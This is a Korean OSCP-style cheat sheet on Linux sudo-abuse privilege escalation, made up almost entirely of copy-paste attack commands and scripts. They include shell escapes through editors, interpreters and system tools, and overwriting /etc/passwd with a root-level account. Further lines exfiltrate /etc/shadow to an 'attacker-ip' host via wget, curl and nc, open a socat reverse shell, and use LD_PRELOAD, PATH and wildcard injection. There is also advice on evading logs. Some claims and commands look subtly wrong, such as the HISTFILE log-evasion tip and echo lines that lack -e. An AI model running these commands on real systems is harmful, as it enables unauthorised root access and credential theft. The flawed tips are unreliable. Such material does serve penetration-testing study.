# Linux Sudo Abuse Privilege Escalation

> **OSCP 핵심**: sudo 권한을 악용하여 즉시 root 권한 획득하는 모든 방법들

## ⚡ 즉시 실행할 명령어들

### 🔍 sudo 권한 확인 (5초 안에)

```bash
# 가장 중요한 명령어 - 즉시 실행!
sudo -l

# 패스워드 없이 실행 가능한 명령어 확인
sudo -l 2>/dev/null | grep -E "(NOPASSWD|!authenticate)"

# 현재 사용자로 실행 가능한 모든 명령어
sudo -l 2>/dev/null | grep -E "(ALL|/usr/bin|/bin)"

# 환경 변수 상속 가능 여부
sudo -l 2>/dev/null | grep -E "(env_keep|env_reset)"
```

### 🎯 즉시 테스트할 GTFOBins 바이너리 (30초)

```bash
# 쉘 관련 - 발견시 즉시 root!
sudo -l 2>/dev/null | grep -E "(bash|sh|zsh|dash|fish|csh)"

# 에디터 - 거의 확실한 root 획득
sudo -l 2>/dev/null | grep -E "(vim|nano|emacs|ed|view)"

# 스크립팅 언어 - 높은 성공률
sudo -l 2>/dev/null | grep -E "(python|python3|perl|ruby|lua|node)"

# 시스템 도구들
sudo -l 2>/dev/null | grep -E "(find|nmap|gdb|strace|ltrace)"

# 파일 조작 도구들
sudo -l 2>/dev/null | grep -E "(cp|mv|tar|rsync|zip)"

# 페이저 도구들
sudo -l 2>/dev/null | grep -E "(more|less|man|pager)"
```

### ⚡ 환경 변수 확인 (즉시)

```bash
# LD_PRELOAD 가능 여부 확인
sudo -l 2>/dev/null | grep -i "env_keep.*LD_PRELOAD"

# PATH 조작 가능 여부
sudo -l 2>/dev/null | grep -i "env_keep.*PATH"

# PYTHONPATH 조작 가능
sudo -l 2>/dev/null | grep -i "env_keep.*PYTHON"
```

## 📋 단계별 체크리스트

### Phase 1: sudo 권한 분석 (1분)

- [ ] **기본 확인**: `sudo -l` 실행하여 전체 권한 파악
- [ ] **NOPASSWD 확인**: 패스워드 없이 실행 가능한 명령어들
- [ ] **환경 변수 상속**: env_keep, env_reset 옵션 확인
- [ ] **실행 가능 바이너리**: 구체적인 경로와 인자 제한 확인
- [ ] **와일드카드 사용**: 명령어에 \* 나 ? 같은 와일드카드 있는지

### Phase 2: GTFOBins 매칭 (2분)

- [ ] **직접 쉘**: bash, sh, vim, python 등 즉시 쉘 가능한 것들
- [ ] **파일 조작**: cp, mv로 /etc/passwd 덮어쓰기 가능한지
- [ ] **파일 읽기**: cat, less로 /etc/shadow 읽기 가능한지
- [ ] **명령 실행**: find, nmap 등으로 임의 명령 실행 가능한지
- [ ] **스크립트 실행**: 스크립트 파일이 sudo로 실행되는지

### Phase 3: 고급 기법 확인 (2분)

- [ ] **환경 변수 악용**: LD_PRELOAD, PATH 하이재킹 가능한지
- [ ] **와일드카드 인젝션**: tar, rsync 등에서 파일명 인젝션
- [ ] **상대 경로 악용**: sudo로 실행되는 스크립트의 상대 경로
- [ ] **심볼릭 링크**: 심볼릭 링크를 이용한 파일 덮어쓰기

## 🎯 발견별 즉시 익스플로잇

### 🐚 직접 쉘 실행 (즉시 root!)

```bash
# bash/sh sudo 권한이 있는 경우
sudo bash
sudo sh
sudo /bin/bash
sudo /bin/sh

# zsh, dash 등
sudo zsh
sudo dash
sudo fish

# sudo su로 root 전환
sudo su
sudo su -
sudo su root
```

### 📝 에디터를 통한 쉘 실행

```bash
# vim sudo 권한이 있는 경우
sudo vim -c ':!/bin/sh'
# 또는 vim 실행 후
:!/bin/sh
:set shell=/bin/sh
:shell

# nano로 root 쉘
sudo nano
# nano에서 Ctrl+R, Ctrl+X 입력 후
reset; sh 1>&0 2>&0

# emacs로 쉘 실행
sudo emacs -Q -nw --eval '(term "/bin/sh")'

# ed 에디터
sudo ed
!/bin/sh

# view (vim의 읽기 전용 모드)
sudo view -c ':!/bin/sh'

# 파일 편집을 통한 권한상승 (/etc/passwd 수정)
sudo vim /etc/passwd
# 다음 라인 추가: hacker:$6$salt$hash:0:0:root:/root:/bin/bash
```

### 🐍 스크립팅 언어 악용

```bash
# python으로 쉘 실행
sudo python -c 'import os; os.system("/bin/sh")'
sudo python -c 'import pty; pty.spawn("/bin/sh")'
sudo python -c 'import subprocess; subprocess.call(["/bin/sh"])'

# python3
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo python3 -c 'import pty; pty.spawn("/bin/sh")'

# perl 스크립트
sudo perl -e 'exec "/bin/sh";'
sudo perl -e 'system("/bin/sh");'

# ruby 스크립트
sudo ruby -e 'exec "/bin/sh"'
sudo ruby -e 'system("/bin/sh")'

# lua 스크립트
sudo lua -e 'os.execute("/bin/sh")'

# node.js
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
sudo node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'

# awk 스크립트
sudo awk 'BEGIN {system("/bin/sh")}'
```

### 🔍 시스템 도구 악용

```bash
# find로 명령 실행
sudo find . -exec /bin/sh \; -quit
sudo find /home -type f -exec /bin/sh \; -quit
sudo find . -name "*.txt" -exec /bin/sh \; -quit

# nmap 인터랙티브 모드 (구버전)
sudo nmap --interactive
nmap> !sh

# nmap NSE 스크립트
echo "os.execute('/bin/sh')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse

# gdb 디버거
sudo gdb -nx -ex '!sh' -ex quit
sudo gdb -nx -ex 'python import os; os.system("/bin/sh")' -ex quit

# strace로 쉘 실행
sudo strace -o /dev/null /bin/sh

# ltrace로 쉘 실행
sudo ltrace -b -L -- /bin/sh

# tcpdump로 명령 실행
echo '#!/bin/sh\n/bin/sh' > /tmp/shell
chmod +x /tmp/shell
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell
```

### 📄 페이저 도구 악용

```bash
# more로 쉘 실행
sudo more /etc/profile
# more 프롬프트에서
!/sh

# less로 쉘 실행
sudo less /etc/profile
# less에서
!/sh

# man 페이지에서 쉘
sudo man man
# man 페이지에서
!/sh

# journalctl (systemd 로그)
sudo journalctl
# 페이저에서
!/sh
```

### 📁 파일 조작 도구 악용

```bash
# cp로 /etc/passwd 덮어쓰기
echo 'hacker:$6$salt$hash:0:0:root:/root:/bin/bash' > /tmp/passwd
sudo cp /tmp/passwd /etc/passwd
su hacker

# 또는 shadow 파일 복사
sudo cp /etc/shadow /tmp/shadow
# 그리고 크랙

# mv로 파일 이동
echo 'hacker:$6$salt$hash:0:0:root:/root:/bin/bash' > /tmp/passwd
sudo mv /etc/passwd /etc/passwd.bak
sudo mv /tmp/passwd /etc/passwd

# tar로 명령 실행
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# rsync로 명령 실행
sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null

# 7z, zip 등
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

### 🔧 기타 도구들

```bash
# cat으로 파일 읽기 (/etc/shadow)
sudo cat /etc/shadow

# head/tail로 파일 읽기
sudo head -c 1G /etc/shadow
sudo tail -c 1G /etc/shadow

# xxd로 파일 읽기
sudo xxd /etc/shadow | xxd -r

# base64로 파일 읽기
sudo base64 /etc/shadow | base64 --decode

# dd로 파일 읽기
sudo dd if=/etc/shadow of=/tmp/shadow 2>/dev/null

# wget/curl로 파일 업로드
sudo wget --post-file=/etc/shadow http://attacker-ip/
sudo curl -X POST --data-binary @/etc/shadow http://attacker-ip/

# nc로 파일 전송
sudo nc -w 3 attacker-ip 4444 < /etc/shadow

# socat으로 리버스쉘
sudo socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker-ip:4444
```

## 🤖 자동화 도구 활용

### 🔍 sudo 권한 자동 분석 스크립트

```bash
# sudo 권한 종합 분석 (복붙용)
sudo_analysis() {
    echo "=== SUDO PERMISSIONS ANALYSIS ==="

    # 기본 sudo 권한
    echo "[+] Basic sudo permissions:"
    sudo -l 2>/dev/null

    echo -e "\n[+] NOPASSWD commands:"
    sudo -l 2>/dev/null | grep NOPASSWD

    echo -e "\n[+] Environment variables:"
    sudo -l 2>/dev/null | grep -E "(env_keep|env_reset)"

    echo -e "\n[+] GTFOBins matches:"
    gtfobins_sudo="bash sh zsh dash fish vim nano emacs ed view python python3 perl ruby lua node find nmap gdb strace more less man journalctl cp mv tar rsync zip"
    for binary in $gtfobins_sudo; do
        sudo -l 2>/dev/null | grep -q "$binary" && echo "FOUND: $binary"
    done

    echo -e "\n[+] Wildcard usage:"
    sudo -l 2>/dev/null | grep "*"

    echo -e "\n[+] Script files:"
    sudo -l 2>/dev/null | grep -E "\.sh|\.py|\.pl|\.rb"
}

# 실행
sudo_analysis
```

### 🎯 즉시 익스플로잇 테스트 스크립트

```bash
# sudo 익스플로잇 자동 테스트 (복붙용)
auto_sudo_exploit() {
    echo "=== AUTOMATED SUDO EXPLOIT ATTEMPTS ==="

    # 직접 쉘 테스트
    if sudo -l 2>/dev/null | grep -q "bash"; then
        echo "[!] Testing: sudo bash"
        echo "sudo bash" && return
    fi

    if sudo -l 2>/dev/null | grep -q "sh"; then
        echo "[!] Testing: sudo sh"
        echo "sudo sh" && return
    fi

    # vim 테스트
    if sudo -l 2>/dev/null | grep -q "vim"; then
        echo "[!] Found sudo vim - Manual exploit:"
        echo "sudo vim -c ':!/bin/sh'"
    fi

    # python 테스트
    if sudo -l 2>/dev/null | grep -q "python"; then
        echo "[!] Testing: python exploit"
        echo 'sudo python -c "import os; os.system(\"/bin/sh\")"'
    fi

    # find 테스트
    if sudo -l 2>/dev/null | grep -q "find"; then
        echo "[!] Testing: find exploit"
        echo 'sudo find . -exec /bin/sh \; -quit'
    fi

    # 환경 변수 테스트
    if sudo -l 2>/dev/null | grep -q "env_keep.*LD_PRELOAD"; then
        echo "[!] LD_PRELOAD exploitation possible!"
        echo "Create malicious .so file and use LD_PRELOAD"
    fi
}

# 실행
auto_sudo_exploit
```

### 🔧 LinPEAS sudo 정보 추출

```bash
# LinPEAS에서 sudo 관련 정보만 빠르게 확인
./linpeas.sh | grep -A 10 -B 5 "sudo"

# 또는 특정 섹션만
./linpeas.sh -o UsrI | grep -E "(sudo|NOPASSWD)"
```

## 👀 놓치기 쉬운 것들

### 🚨 환경 변수 악용

```bash
# 1. LD_PRELOAD 하이재킹
if sudo -l | grep -q "env_keep.*LD_PRELOAD"; then
    echo "LD_PRELOAD exploitation:"
    echo 'void _init() { setuid(0); system("/bin/sh"); }' > /tmp/lib.c
    gcc -fPIC -shared -o /tmp/lib.so /tmp/lib.c -nostartfiles
    sudo LD_PRELOAD=/tmp/lib.so program
fi

# 2. PATH 하이재킹
if sudo -l | grep -q "env_keep.*PATH"; then
    echo "PATH hijacking:"
    export PATH=/tmp:$PATH
    echo '#!/bin/bash\n/bin/sh' > /tmp/program_name
    chmod +x /tmp/program_name
    sudo program_name
fi

# 3. PYTHONPATH 하이재킹
if sudo -l | grep -q "env_keep.*PYTHON"; then
    echo "PYTHONPATH hijacking:"
    echo 'import os; os.system("/bin/sh")' > /tmp/module.py
    sudo PYTHONPATH=/tmp python -c 'import module'
fi

# 4. LD_LIBRARY_PATH 하이재킹
if sudo -l | grep -q "env_keep.*LD_LIBRARY_PATH"; then
    echo "LD_LIBRARY_PATH exploitation possible"
fi
```

### 🔍 와일드카드 인젝션

```bash
# tar 와일드카드 인젝션
if sudo -l | grep -q "tar.*\*"; then
    echo "TAR wildcard injection:"
    echo -e '#!/bin/bash\n/bin/sh' > /tmp/shell.sh
    chmod +x /tmp/shell.sh
    touch /tmp/--checkpoint=1
    touch /tmp/--checkpoint-action=exec=sh\ /tmp/shell.sh
    # sudo tar 명령어에 /tmp/* 포함시 실행됨
fi

# rsync 와일드카드 인젝션
if sudo -l | grep -q "rsync.*\*"; then
    echo "RSYNC wildcard injection:"
    touch /tmp/-e sh
    touch /tmp/x
    # sudo rsync /tmp/* destination 실행시 쉘 획득
fi

# chown 와일드카드 인젝션
if sudo -l | grep -q "chown.*\*"; then
    echo "CHOWN wildcard injection:"
    touch /tmp/--reference=/etc/passwd
    # sudo chown user /tmp/* 실행시 /etc/passwd 권한 변경
fi
```

### 📝 스크립트 파일 악용

```bash
# 1. 스크립트 파일 자체를 덮어쓸 수 있는 경우
script_path=$(sudo -l 2>/dev/null | grep -o '/[^[:space:]]*\.sh')
if [ ! -z "$script_path" ]; then
    if [ -w "$script_path" ]; then
        echo "Script writable: $script_path"
        echo '#!/bin/bash\n/bin/sh' > "$script_path"
    fi
fi

# 2. 스크립트가 호출하는 다른 프로그램 하이재킹
# 스크립트 내용 확인
script_files=$(sudo -l 2>/dev/null | grep -o '/[^[:space:]]*\.\(sh\|py\|pl\|rb\)')
for script in $script_files; do
    echo "=== Analyzing script: $script ==="
    cat "$script" 2>/dev/null | grep -E "(system|exec|popen|call)" | head -5
done

# 3. 상대 경로로 호출되는 프로그램들
for script in $script_files; do
    echo "=== Relative paths in: $script ==="
    cat "$script" 2>/dev/null | grep -v '^#' | grep -o '[^/[:space:]]*[[:space:]]' | grep -v '^$' | head -5
done
```

### 🔧 고급 sudo 우회 기법

```bash
# 1. sudo 타임스탬프 재사용
sudo -n true 2>/dev/null && echo "Sudo timestamp still valid"

# 2. sudo 로그 우회 (로그 안남기기)
unset HISTFILE
sudo command

# 3. sudo with shell metacharacters
sudo sh -c 'command; /bin/sh'
sudo bash -c 'command && /bin/sh'

# 4. 명령어 체이닝
sudo command1 && /bin/sh
sudo command1 ; /bin/sh
sudo command1 | /bin/sh

# 5. 파일 디스크립터 활용
sudo command 0</dev/tty
sudo sh 0<&1

# 6. 인자 인젝션 (특정 프로그램에서)
sudo program -option "value; /bin/sh"
sudo program --config=/tmp/evil_config

# 7. 심볼릭 링크 활용
ln -sf /bin/sh /tmp/innocent_name
sudo /tmp/innocent_name

# 8. Race condition (드물지만 가능)
while true; do
    ln -sf /bin/sh /tmp/target 2>/dev/null
    ln -sf /bin/false /tmp/target 2>/dev/null
done &
sudo /tmp/target
```

### ⚡ 응급상황 체크리스트 (모든 게 안될 때)

```bash
# 1. sudo 버전 확인 (CVE 검색용)
sudo --version

# 2. sudoers 파일 읽기 권한 확인
ls -la /etc/sudoers
ls -la /etc/sudoers.d/

# 3. sudo 로그 확인
tail -f /var/log/auth.log | grep sudo &
tail -f /var/log/secure | grep sudo &

# 4. 다른 사용자의 sudo 권한
cat /etc/group | grep sudo
cat /etc/group | grep wheel
cat /etc/group | grep admin

# 5. PKexec 확인 (sudo 대안)
which pkexec
ls -la /usr/bin/pkexec

# 6. su 명령어 sudo 권한
sudo -l | grep -E "(su|runuser|login)"

# 7. 시스템 관리 명령어들
sudo -l | grep -E "(systemctl|service|mount|umount|crontab)"

# 8. 네트워크 도구들
sudo -l | grep -E "(iptables|ufw|netstat|ss|tcpdump|wireshark)"

# 9. 파일시스템 도구들
sudo -l | grep -E "(fdisk|mkfs|fsck|lsblk|blkid)"

# 10. 압축/아카이브 도구들
sudo -l | grep -E "(tar|gzip|gunzip|zip|unzip|7z|rar)"
```

## 🚨 중요 참고사항

### ⏰ 시간 관리

- **첫 1분**: `sudo -l` 확인 및 NOPASSWD 명령어 파악
- **다음 2분**: GTFOBins 매칭 및 직접 익스플로잇 시도
- **추가 2분**: 환경 변수나 와일드카드 인젝션 시도
- **5분 후**: 다른 권한상승 벡터나 머신 고려

### 🎯 성공률 높은 순서

1. **직접 쉘**: bash, sh, su 등 (100% 성공)
2. **에디터**: vim, nano 등 (거의 100%)
3. **스크립팅**: python, perl 등 (높은 성공률)
4. **시스템 도구**: find, nmap 등
5. **환경 변수 악용**: LD_PRELOAD, PATH 하이재킹

### 🔥 즉시 시도할 것들

- `sudo -l` 실행 후 NOPASSWD 명령어 우선 확인
- GTFOBins 웹사이트에서 발견된 바이너리 검색
- 환경 변수 상속 가능하면 LD_PRELOAD 시도
- 와일드카드 있으면 인젝션 기법 시도

### 💡 팁

- sudo 권한은 가장 빠른 권한상승 방법
- GTFOBins를 즐겨찾기에 추가하여 실시간 검색
- 여러 방법 조합해서 시도 (예: vim으로 스크립트 수정)
- 성공시 즉시 `/bin/bash -i`로 쉘 안정화
